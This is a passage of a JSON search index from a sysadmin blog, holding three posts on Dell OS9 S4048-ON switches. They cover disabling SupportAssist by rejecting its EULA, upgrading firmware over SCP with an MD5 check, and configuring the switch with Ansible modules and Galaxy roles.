        "excerpt":"I am continuing write articles about DELL Networking System (OS9 series). This short note will show how to disable SupportAssist, enabled by default installation.   About SupportAssist   SupportAssist sends troubleshooting data securely to Dell. SupportAssist does not support automated email notification at the time of hardware fault alert, automatic case creation, automatic part dispatch, or reports. SupportAssist requires Dell EMC Networking OS9.   About problem   Every time I log in to my Dell switch I see this:   The SupportAssist EULA acceptance option has not been selected. SupportAssist  can be enabled once the SupportAssist EULA has been accepted. Use the:  'support-assist activate' command to accept EULA and enable SupportAssist.   So I wand to disable this. I would try running this command (in CONF mode):  Dell# conf Dell(conf)# eula-consent support-assist reject   The result will be:  I do not accept the terms of the license agreement. The SupportAssist feature has been deactivated and can no longer be used. To enable SupportAssist configurations, accept the terms of the license agreement by configuring this command 'eula-consent support-assist accept'.   Check the status   If you enter the command show eula-consent support-assist you will see a status (Rejected) of this feature:   Dell# show eula-consent support-assist  SupportAssist EULA has been: Rejected  Additional information about the SupportAssist EULA is as follows:  By installing SupportAssist, you allow Dell EMC to save your contact information (e.g. name, phone number and/or email address) which would be used to provide technical support for your Dell EMC products and services.  Dell EMC may use the information for providing recommendations to improve  your IT infrastructure.  Dell EMC SupportAssist also collects and stores machine diagnostic information, which may include but is not limited to configuration information, user supplied contact information, names of data volumes, IP addresses, access control lists, diagnostics &amp; performance information, network configuration information, host/server configuration &amp; performance information and related data (\"Collected Data\") and transmits this information to Dell EMC. By downloading SupportAssist and agreeing to be bound by these terms and the Dell EMC end user license agreement, available at: https://i.dell.com /sites/doccontent/legal/terms-conditions/en/Documents/E-EULA_01June2018.pdf, you agree to allow Dell EMC to provide remote monitoring services of your IT environment and you give Dell EMC the right to collect the Collected Data in accordance with Dell EMC's Privacy Policy, available at: https://www.dell.com/learn/us/en/uscorp1 /policies-privacy-country-specific-privacy-policy, in order to enable the performance of all of the various functions of SupportAssist during your entitlement to receive related repair services from Dell EMC. You further agree to allow Dell EMC to transmit and store the Collected Data from SupportAssist in accordance with these terms. You agree that the provision of SupportAssist may involve international transfers of data from you to Dell EMC and/or to Dell EMC's affiliates, subcontractors or business partners. When making such transfers, Dell EMC shall ensure appropriate protection is in place to safeguard the Collected Data being transferred in connection with SupportAssist. If you are downloading SupportAssist on behalf of a company or other legal entity, you are further certifying to Dell EMC that you have appropriate authority to provide this consent on behalf of that entity. If you do not consent to the collection, transmission and/or use of the Collected Data, you may not download, install or otherwise use SupportAssist.   Conclusion   This short post that could be packed in one command. But I want to point an importance of security. Any communication with external system might be used as a back-door attacker. The SupportAssist has have a vulnerability in the past. Read the post about it.   Additional information      MXL - how to get rid of the nag about Support Assist - user question on the Dell forum about the same   Dell Command Line Reference Guide for the S4048–ON System - dell man page included full command list  ","categories": ["sysad"],
        "tags": ["dell","networks","security"],
        "url": "https://gainanov.pro/eng-blog/sysad/dell-smartassist-disable/",
        "teaser": null
      },{
        "title": "DELL. Upgrade firmware on Dell S4048 switch (S-series, OS9)",
        "excerpt":"Today I would like install the last version of the Dell networking OS9 system. Follow to my guide I tested on my Dell PowerSwitch S4048-ON.   Prerequisites   I already configure management interface and ssh server. Read my previous post if you didn’t make it.   Download the latest firmware   Open the browser. Enter to the site force10networks. It requires an account. Register the user. Fill the Register form and put DELL as a Force10 contact. You will receive after 2 or 3 days your credential.   Follow to the link. The Software Center page will be open. Try to find by switch name - S4048-ON.   In the head of table you see the last version of firmware. Download the file with name - FTOS-SK-9.14.2.7.bin. The file ONIE-FTOS-SK-xxx need to update system by ONIE loader. We will upgrading system with easy way.      Also download and carefully read the Release Notes.   Check the current system   The commands below will show a useful information about your device:     show os-version   show system stack-unit 1   show revision   show version   show boot sys stack-unit all   I recommend to run them before upgrade the firmware. It could help to prevent any errors if it will be.   For example my output of the command show version:   DellEMC# show version  Dell EMC Real Time Operating System Software Dell EMC Operating System Version:  2.0 Dell EMC Application Software Version:  9.13(0.1) Copyright (c) 1999-2018 by Dell Inc. All Rights Reserved. Build Time: Tue Feb 27 09:27:11 2018 Build Path: /build/build05/SW/SRC Dell EMC Networking OS uptime is 1 week(s), 1 day(s), 10 hour(s), 59 minute(s)  System image file is \"system://A\"  System Type: S4048-ON Control Processor: Intel Rangeley with 3 Gbytes (3201302528 bytes) of memory, core(s) 2.  8G bytes of boot flash memory.    1 54-port TE/FG (SK-ON)  48 Ten GigabitEthernet/IEEE 802.3 interface(s)   6 Forty GigabitEthernet/IEEE 802.3 interface(s)   So my current version of system - 9.13(0.1). And I will upgrade to 9.14(2.7)   Backup configuration   Dell EMC Networking recommends that you back up your startup configuration and any important files and directories to an external media prior to upgrading the system.   Run the copy command to save running-config to some network host by SSH:   copy running-config scp:   Upgrading   Follow these steps carefully to upgrade your S4048-ON systems.      Copy Firmware from my Mac to flash memory on device   DellEMC# copy scp://admin:some_strong_password@192.168.101.3 flash://FTOS-SK-9.14.2.7.bin  Source file name []: /Users/admin/Documents/dell/firmware/FTOS-SK-9.14.2.7.bin !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 72581613 bytes successfully copied      Verify a hash sum (it should be the same as presented in Download page)   DellEMC# verify md5 FTOS-SK-9.14.2.7.bin MD5 hash for FTOS-SK-9.14.2.7.bin : ae09a0042db441291b119708b890bb8c      Upgrade the Dell EMC Networking OS in flash partition A: or B:   DellEMC# upgrade system flash://FTOS-SK-9.14.2.7.bin A:  !................................................! 72581613 bytes successfully copied System image upgrade completed successfully.      Verify that the Dell EMC Networking OS has been upgraded correctly in the upgraded flash partition   DellEMC# show boot system stack-unit all  Current system image information in the system: ===============================================  Type          Boot Type       A                                  B ---------------------------------------------------------------------------------------------- stack-unit 1  FLASH BOOT      9.14(2.7)[boot]                    9.13(0.1)                          stack-unit 2 is not present. stack-unit 3 is not present. stack-unit 4 is not present. stack-unit 5 is not present. stack-unit 6 is not present.      NOTE: If your boot flash partition is different then A: You should change the Primary Boot Parameter - DellEMC(conf)# boot system stack-unit 1 primary system: A:       Save the configuration so that the configuration will be retained after a reload using write memory command.   DellEMC# write memory      Reload the unit   DellEMC# reload  Proceed with reload [confirm yes/no]: yes   Verification   Verify the switch has been upgraded to the Dell EMC Networking OS version 9.14(2.7)   DellEMC# show version  Dell EMC Real Time Operating System Software Dell EMC Operating System Version:  2.0 Dell EMC Application Software Version:  9.14(2.7) Copyright (c) 1999-2019 by Dell Inc. All Rights Reserved. Build Time: Tue Jun 23 09:25:55 2020 Build Path: /build/build02/SW/SRC Dell EMC Networking OS uptime is 12 hour(s), 53 minute(s)  System image file is \"system://A\"  System Type: S4048-ON Control Processor: Intel Rangeley with 3 Gbytes (3201302528 bytes) of memory, core(s) 2.  8G bytes of boot flash memory.    1 54-port TE/FG (SK-ON)  48 Ten GigabitEthernet/IEEE 802.3 interface(s)   6 Forty GigabitEthernet/IEEE 802.3 interface(s)   Conclusion   I spend more time to understand how to upgrade the system then the switch is upgrading. I’m hope this article could save a time you. Have a nice flashing.   Additional information      Software Center for Force10 devises - site where the firmware for Dell devices placed   Dell Command Line Reference Guide for the S4048–ON System - dell man page included full command list   ","categories": ["sysad"],
        "tags": ["dell","networks","firmware"],
        "url": "https://gainanov.pro/eng-blog/sysad/dell-switch-upgrade-firmware/",
        "teaser": null
      },{
        "title": "DELL. Configure Dell 10 gigabit switch with Ansible",
        "excerpt":"Today I would like to talk how to easy configure a network switch with Ansible. In the past when no one listens about “Infrastructure as a Code” (IaaC) methodology we setuping our devices throw console. We type command by command successively. We copy configure scripts and edit them on device. It’s good, but when you configure many devices you often will mistakes.   Today with a very beautiful utility as Ansible. We could automate many actions, that we make manually earlier. Futhermore we can configure a network switches like Dell and Cisco too. Ansible has a specific modules for these things.   If you already familiar with Ansible you will see how it come easy. Soo in this post I want to share my experience about it. It will include many practical examples. All code sketches has been tested by me on Dell S4048 10-gigabit switch.   Prerequisites   These examples requires the following:     Ansible 2.5 (or higher) installed. See Installing Ansible for more information.   Dell OS9 platform device.   Basic understanding of YAML Syntax.   Basic Linux command line use.   Basic knowledge of network switch &amp; router configurations.   You should have enabled SSH-server. See my previous post about configuring it. It is not difficult. Also you should append the connection rate by SSH on the network device. Use the command below to configure the maximum number of incoming SSH connections per minute.  # ip ssh connection-rate-limit 60   Tested Environment      Dell Switch S4048 (OS9 Network System v.9.14)   Ansible 2.9.11 with Python 3.8 runs on MacOS   Inventory   All Ansible tasks started with adding a new host into Inventory file.   I prefer to use inventory stored in YAML format. This is mine (stored in hosts file):  ...   hosts:     switch10g_new:       ansible_host: 192.168.1.10       ansible_user: admin       ansible_network_os: dellos9   This piece has told Ansible that the host named switch10g_new should be accessible by selected IP and user name.   Before continue writing a playbook try to connect with your credentials to the device. You should connecting throw ssh with command (ssh admin@192.168.1.10) from your local device without any problem.   Playbook   My playbook (saved on dell-switch-playbook.yml file) consists of the next rows:  - hosts:     - switch10g_new   gather_facts: no   connection: local   roles:     - role: dell   I have just run a role named dell. But in the real life do not use this name for the role.   The role dell include many tasks.   Tasks   Let’s run some simple tasks. Open Ansible documentation and found a part about network modules.   Modules for Dell OS9 series devices includes these three modules:     dellos9_command – Run commands on remote devices running Dell OS9   dellos9_config – Manage Dell EMC Networking OS9 configuration sections   dellos9_facts – Collect facts from remote devices running Dell EMC Networking OS9   Try to use them and see that we can make with. I will start from the end of the list.   dellos9_facts   This module collect a base set of device facts from a remote device. All fact keys prepends with ansible_net_&lt;fact&gt;.      Task to see on your local console the facts of remote device   - name: Collect all facts from the device   dellos9_facts:     # all, hardware, config, and interfaces     # '!' to specify that a specific subset should not be collected.     # gather_subset: [\"all\"]     # gather_subset: [\"config\", \"hardware\"]     gather_subset: [\"all\", \"!interfaces\"]   register: dellos9_facts  - name: Show dellos9_facts   debug:     var: dellos9_facts      The result of the command will presented below:     ok: [switch10g_new] =&gt; { \"dellos9_facts\": {     \"ansible_facts\": {         \"ansible_net_config\": \"Current Configuration ...\",         \"ansible_net_filesystems\": [             \"flash\",             \"fcmfs\",             \"nfsmount\",             \"ftp\",             \"tftp\",             \"scp\",             \"http\",             \"https\"         ],         \"ansible_net_gather_subset\": [             \"hardware\",             \"default\",             \"config\"         ],         \"ansible_net_hostname\": \"DellEMC\",         \"ansible_net_image\": \"system://A\",         \"ansible_net_memfree_mb\": 3123970,         \"ansible_net_memtotal_mb\": 3126272,         \"ansible_net_model\": \"S4048-ON \",         \"ansible_net_serialnum\": \"NA\",         \"ansible_net_version\": \"9.14(2.7)\"     },     \"changed\": false,     \"failed\": false } }           Task related with previous to save a switch configuration to your local directory files/   - name: Save an active config from the device to localhost   vars:     running_config: \"{{ dellos9_facts['ansible_facts']['ansible_net_config'] }}\"   local_action:     module: copy     content: \"{{ running_config }}\"     dest: \"files/running_config_{{ inventory_hostname }}\"   dellos9_command   The module dellos9_command sends commands to the host and returns the results read from the device. You should know that this module does not support running commands in CONF mode.   It useful to show something about your device.      Task for getting a device version   - name: Detect a device version   dellos9_command:     commands: show version   register: show_ver  - name: show version command output   debug:     var: show_ver.stdout_lines      The result will be like:   TASK [dell : show version command output]*************************************** ok: [switch10g_new] =&gt; {     \"show_ver.stdout_lines\": [         [             \"Dell EMC Real Time Operating System Software\",             \"Dell EMC Operating System Version:  2.0\",             \"Dell EMC Application Software Version:  9.14(2.7)\",             \"Dell EMC Networking OS uptime is 56 minute(s)\",             \"\",             \"System Type: S4048-ON \",             \"\",             \"8G bytes of boot flash memory.\",             \"\",             \"  1 54-port TE/FG (SK-ON)\",             \" 48 Ten GigabitEthernet/IEEE 802.3 interface(s)\",             \"  6 Forty GigabitEthernet/IEEE 802.3 interface(s)\"         ]     ] }      Or task to see a device time   - name: Get device clock   dellos9_command:     commands:       - show clock   register: show_clock - debug: var=show_clock.stdout   Now we ready using a module that will change a state, that will edit a configuration of the device   dellos9_config   The module dellos9_config writes a blocks of code into your device configuration. It has before and after parameters to exactly point the place where your code should saved.      Task for changing an interface configuration   - name: \"Enable interface and dhcp client on port te1/1\"   dellos9_config:     lines:       - 'ip address dhcp'       - 'no shutdown'     parents:       - 'interface TenGigabitEthernet 1/1'   register: enable_interface - debug: var=enable_interface      The result of the task:   TASK [dell : Enable interface and dhcp client on port te1/1] ******************* changed: [switch10g_new]  TASK [dell : debug] ************************************************************ ok: [switch10g_new] =&gt; {     \"enable_interface\": {         \"changed\": true,         \"commands\": [             \"interface TenGigabitEthernet 1/1\",             \"ip address dhcp\",             \"no shutdown\"         ],         \"failed\": false,         \"saved\": false,         \"updates\": [             \"interface TenGigabitEthernet 1/1\",             \"ip address dhcp\",             \"no shutdown\"         ]     } }   Also it useful to run some actions that acquire to input answer to a prompt.      Task for saving running_config to startup_config   - name: \"Copy running-config to startup-config for the Dell EMC OS9 Device\"   dellos9_config:     lines:       - command: do copy running-config startup-config         prompt: '\\[confirm yes/no\\]:\\s?$'         answer: \"yes\"   Galaxy roles   Dell EMC Open-Source Community in Github provides many Galaxy roles. But it is just a wrapper on the modules explained earlier. It provide a good interface to edit a network configure as structured YAML variables stored in files. See a full list of the Galaxy roles here   To use these Dell Galaxy roles you need to download them. Define all roles that you want download into a file like this mine. I prefer to save an all external roles into a local directory ./ansible_roles. So this file I will save into this directory. After that run a command to download them:  ansible-galaxy install -r ansible-roles/dellemc_roles.yml   Next write a new playbook to run some tasks defined in the downloaded Galaxy roles.      Playbook - dell-switch-configure.yml   - hosts:     - switch10g_new   gather_facts: no   # become: yes   # become_method: enable   connection: local   # connection: network_cli    roles:     - role: ansible-roles/Dell-Networking.dellos-system     - role: ansible-roles/Dell-Networking.dellos-interface     - role: ansible-roles/Dell-Networking.dellos-vlan      Host variables - host_vars/switch10g_new.yaml   # https://galaxy.ansible.com/Dell-Networking/dellos-system dellos_system:   hostname: \"{{ inventory_hostname }}\"  # https://galaxy.ansible.com/Dell-Networking/dellos-interface dellos_interface:     # interface TenGigabitEthernet 1/22     #   description T-GPU1     #   no ip address     #   portmode hybrid     #   switchport     #   no shutdown     TenGigabitEthernet 1/22:       desc: \"T-GPU1\"       ip_and_mask:  # set up `no ip address`       portmode: hybrid  # pass both untagged and tagged VLANs       switchport: true       # ip_type_dynamic: true # Configures IP address DHCP if set to true (ip_and_mask is ignored if set to true)       # ip_and_mask: 192.168.23.22/24 # Configures the specified IP address (192.168.11.1/24 format)       admin: up  # enables the interface      # interface Port-channel 1     #   no ip address     #   switchport     #   no shutdown     port-channel 1:       ip_and_mask:       switchport: true       admin: up      # interface Vlan 3     #  description C-DATA     #  no ip address     #  tagged Port-channel 1     #  untagged TenGigabitEthernet 1/22     #  no shutdown     vlan 3:       desc: \"C-DATA\"       ip_and_mask:       # to configure vlan use dellos-vlan role (see next)       admin: up  # https://galaxy.ansible.com/Dell-Networking/dellos-vlan dellos_vlan:     vlan 3:       description: \"C-DATA\"       tagged_members:         - port: \"Port-channel 1\"           state: present       untagged_members:         - port: \"TenGigabitEthernet 1/22\"           state: present       state: present      Explanation of tasks This playbook set up a hostname of a device as inventory hostname. After that it configures interfaces te1/22, po1 and vlan 3. If it does not existing it will create. Next we add members to created vlan 3.   This YAML-file easy to read and it explains capability and power of these galaxy roles. Read more about them in Documentation pages.   Conclusion   In this post I explain the configuration process of network device without console. With Ansible you can make changes with many devices in one time. File of configuration easy to read (because it stored in YAML). All tasks could be saved into Git repository. Futhermore it could possible to update and apply changes with your CI/CD tool.   Also I save all sources into GitHub. You can read all practical examples and clone it.   Additional information      Dell-Networking page on Ansible Galaxy - where placed all galaxy roles written by Community   Dell Command Line Reference Guide for the S4048–ON System - Dell documentation explains Dell EMC Ansible integration   Dellos9 page on Ansible Modules - read more about explained modules   GitHub - Dell-Networking - ansible-dellos-examples - Sample Ansible playbooks to understand how the Dell EMC Networking Anisble Module works.   ","categories": ["devops"],
        "tags": ["dell","networks","ansible","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/dell-ansible-playbook/",
        "teaser": null
      }]
